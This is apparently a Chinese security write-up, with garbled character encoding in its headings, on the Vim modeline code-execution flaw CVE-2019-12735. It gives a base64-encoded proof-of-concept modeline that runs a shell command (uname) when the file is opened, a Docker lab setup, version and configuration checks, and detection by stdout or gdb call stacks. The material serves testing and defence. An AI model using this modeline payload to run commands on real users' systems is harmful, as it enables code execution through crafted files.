    echo "OiF1bmFtZSAtYXx8IiB2aTpmZW46ZmRtPWV4cHI6ZmRlPWFzc2VydF9mYWlscygic291cmNlXCFcIFwlIik6ZmRsPTA6ZmR0PSIK" | base64 --decode > /root/poc.txt 

$ sudo docker build -t vim-cve-2019-12735 .
$ sudo docker run -it vim-cve-2019-12735 /bin/bash
echo -e "set modeline\nset modelines=5" > ~/.vimrc 
cd root
vim poc.txt


```



### æ¼æ´é˜²æŠ¤

#### packageç‰ˆæœ¬æ£€æŸ¥

- æŸ¥çœ‹å¯å®‰è£…çš„Vimç‰ˆæœ¬

```shell
# æŸ¥çœ‹å¯å®‰è£…çš„Vimç‰ˆæœ¬
$ apt-cache policy vim
vim:
  Installed: (none)
  Candidate: 2:7.4.1689-3ubuntu1.4
  Version table:
     2:7.4.1689-3ubuntu1.4 500
        500 https://mirrors.tuna.tsinghua.edu.cn/ubuntu xenial-updates/main amd64 Packages
        500 https://mirrors.tuna.tsinghua.edu.cn/ubuntu xenial-security/main amd64 Packages
     2:7.4.1689-3ubuntu1 500
        500 https://mirrors.tuna.tsinghua.edu.cn/ubuntu xenial/main amd64 Packages

# ä»VimåŒ…çš„changelogä¸­è·å–ä¿®å¤æ¼æ´çš„ç‰ˆæœ¬å· 2:7.4.1689-3ubuntu1.3
$ cat vim_changelog.txt |grep CVE-2019-12735 -C 10
...
vim (2:7.4.1689-3ubuntu1.3) xenial-security; urgency=medium

  * SECURITY UPDATE: Arbitrary code execution
    - debian/patches/CVE-2019-12735.patch: disallow
      sourcing a file in the sandbox in src/getchar.c
    - CVE-2019-12735
  * SECURITY UPDATE: Buffer overflow
    - debian/patches/CVE-2017-5953.patch: check for an
      invalid length in order to avoid a overflow in
      src/spell.c.
    - CVE-2017-5953


 -- Leonidas S. Barbosa <leo.barbosa@canonical.com>  Fri, 07 Jun 2019 12:35:43 -0300


```



- å®‰è£…å­˜åœ¨æ¼æ´çš„ç‰ˆæœ¬

```shell

$ sudo apt install vim-common=2:7.4.1689-3ubuntu1
$ sudo apt install vim-runtime=2:7.4.1689-3ubuntu1
$ sudo apt install vim=2:7.4.1689-3ubuntu1

# é€šè¿‡apt-cache æŸ¥çœ‹å·²å®‰è£…çš„ç‰ˆæœ¬ < 2:7.4.1689-3ubuntu1.3
$ apt-cache policy vim:
  Installed: 2:7.4.1689-3ubuntu1
  Candidate: 2:7.4.1689-3ubuntu1.4
  ...

# é…ç½®vimrcå¼€å¯modelineåŠŸèƒ½
vim ~/.vimrc
i
set modeline
set modelines=5
<ESC>
:w

# æµ‹è¯•æ•ˆæœ
$ vim poc.txt

Linux ubuntu 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux


Press ENTER or type command to cont

```

- å®‰è£…æœ€æ–°ç‰ˆæœ¬çš„vim

```shell
# å®‰è£…æœ€æ–°ç‰ˆæœ¬çš„vim
$ sudo apt install vim

# é€šè¿‡apt-cache æŸ¥çœ‹å·²å®‰è£…çš„ç‰ˆæœ¬ > 2:7.4.1689-3ubuntu1.3
$ apt-cache policy vim
vim:
  Installed: 2:7.4.1689-3ubuntu1.4
  Candidate: 2:7.4.1689-3ubuntu1.4
  ...
 
# é…ç½®vimrcå¼€å¯modelineåŠŸèƒ½
vim ~/.vimrc
i
set modeline
set modelines=5
<ESC>


# æµ‹è¯•æ•ˆæœï¼Œæœªè§¦å‘æ¼æ´
$ vim poc.txt
:!uname -a||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="
~                                                                      ...                                                                    
~                                                                               
"poc.txt" 1L, 75C  

```



#### é…ç½®æ£€æŸ¥

```shell
# æ£€æŸ¥modelineé…ç½®:
$ vim
:verbose set modeline? 
:verbose set modelines?
# å¦‚æœæ˜¾ç¤ºnomodeline, nomodelinesè¡¨ç¤ºæ²¡æœ‰é…ç½®

# å¦‚æœé…ç½®äº†ï¼Œåˆ™ä¼šæ˜¾ç¤ºï¼š

...
ï½                                                                 
  modeline
        Last set from ~/.vimrc
Press ENTER or type command to continue

...
ï½
  modelines=5
        Last set from ~/.vimrc
Press ENTER or type command to continue

# å…³é—­modelineé…ç½®
vim ~/.vimrc
åˆ é™¤
set modeline
set modelines=5
æ·»åŠ 
set nomodeline
:wq

# å†æ¬¡æ£€æŸ¥
$ vim
:verbose set modeline? 

~                                                                     
nomodeline
        Last set from ~/.vimrc
Press ENTER or type command to continue


```

#### pocéªŒè¯

**è¯»å–stdout**

ä»£ç æ‰§è¡Œvimæ‰“å¼€pocè¯»å–stdoutæ ¹æ®è¾“å‡ºåˆ¤æ–­(ç›®å‰çš„æ¥çœ‹ï¼Œè·å–vimçš„è¾“å‡ºè²Œä¼¼æœ‰äº›éº»çƒ¦)

ä¸å­˜åœ¨æ¼æ´æ—¶é‡å®šå‘stdout: 

```shell
$ vim poc.txt >out.txt
Vim: Warning: Output is not to a terminal
$ cat out.txt 
# å†…å®¹ä¸ºç©º 

```



å­˜åœ¨æ¼æ´æ—¶é‡å®šå‘stdout: 

```shell
$ vim poc.txt > out.txt
Vim: Warning: Output is not to a terminal

Press ENTER or type command to continue

$ cat out.txt 
Linux ubuntu 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux


```



**æ£€æŸ¥è°ƒç”¨æ ˆ**

ç±»ä¼¼çš„ï¼Œé€šè¿‡ä»£ç æ‰§è¡Œvimæ‰“å¼€pocï¼Œptraceè°ƒç”¨æ ˆï¼Œæ£€æŸ¥æ˜¯å¦æœ‰do_shellè°ƒç”¨æ— æ¼æ´æ—¶æ­£å¸¸æ‰“å¼€pocæ–‡ä»¶åçš„è°ƒç”¨æ ˆï¼š

```shell
gdb-peda$ bt
#0  0x00007fca6f40b5b3 in __select_nocancel ()
#1  0x000000000052a69c in RealWaitForChar (fd=0x0, 
#2  0x000000000052a444 in WaitForCharOrMouse 
#3  0x000000000052a393 in WaitForChar (msec=0xffffffffffffffff)
#4  0x0000000000526147 in mch_inchar (buf=0x86c66a <typebuf_init+42> 
#5  0x00000000005c381e in ui_inchar (buf=0x86c66a <typebuf_init+42> 
#6  0x00000000004ad1fe in inchar (buf=0x86c66a <typebuf_init+42> "", 
#7  0x00000000004ace26 in vgetorpeek (advance=0x1) at getchar.c:2832
#8  0x00000000004ab07e in vgetc () at getchar.c:1605
#9  0x00000000004ab526 in safe_vgetc () at getchar.c:1801
#10 0x00000000004f8512 in normal_cmd (oap=0x7ffefbcad0c0, 
#11 0x00000000005e96fb in main_loop (cmdwin=0x0, noexmode=0x0) at 
#12 0x00000000005e90e3 in main (argc=0x2, argv=0x7ffefbcad3b8) at 
...

```



å­˜åœ¨æ¼æ´æ—¶ï¼Œæ‰“å¼€pocæ–‡ä»¶åçš„è°ƒç”¨æ ˆï¼Œæœ‰ä¸€ä¸ªæ˜æ˜¾çš„do_shellçš„è°ƒç”¨:

```shell
gdb-peda$ bt
#0  0x00007f4ba14135b3 in __select_nocancel ()
#1  0x000000000052a69c in RealWaitForChar (fd=0x0, 
#2  0x000000000052a444 in WaitForCharOrMouse 
#3  0x000000000052a393 in WaitForChar (msec=0xffffffffffffffff)
#4  0x0000000000526147 in mch_inchar (buf=0x86c66a <typebuf_init+42> 
#5  0x00000000005c381e in ui_inchar (buf=0x86c66a <typebuf_init+42> 
#6  0x00000000004ad1fe in inchar (buf=0x86c66a <typebuf_init+42> "", 
#7  0x00000000004ace26 in vgetorpeek (advance=0x1) at getchar.c:2832
#8  0x00000000004ab07e in vgetc () at getchar.c:1605
#9  0x00000000004ab526 in safe_vgetc () at getchar.c:1801
#10 0x00000000004ce972 in wait_return (redraw=0x1) at message.c:901
#11 0x000000000045ce32 in do_shell (
    cmd=0x15c7ea0 "uname -a||\" vi:fen:fdm=expr:fde=assert_fails(\"source!\\ %\"):fdl=0:fdt=\"", flags=0x0) at ex_cmds.c:1572
#12 0x000000000045c50c in do_bang (addr_count=0x0, 
#13 0x000000000047f480 in ex_bang (eap=0x7ffe20228c50) at 
#14 0x00000000004741d3 in do_one_cmd (cmdlinep=0x7ffe20228d80, 
#15 0x0000000000470d89 in do_cmdline (cmdline=0x0, 
#16 0x00000000005002cd in nv_colon (cap=0x7ffe202293f0) at 
#17 0x00000000004f9650 in normal_cmd (oap=0x7ffe20229480, 
#18 0x00000000005e96fb in main_loop (cmdwin=0x0, noexmode=0x0) at 
#19 0x00000000005e90e3 in main (argc=0x2, argv=0x7ffe20229778) at 



```

